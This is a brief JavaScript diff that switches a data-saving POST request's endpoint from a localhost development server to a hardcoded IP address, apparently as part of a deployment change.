@@ -68,7 +68,7 @@
       const shortId = Math.random().toString(36).substr(2, 6);
 
       try {
-        const response = await fetch('http://localhost:3000/save-data', {
+        const response = await fetch('https://103.187.146.79/save-data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
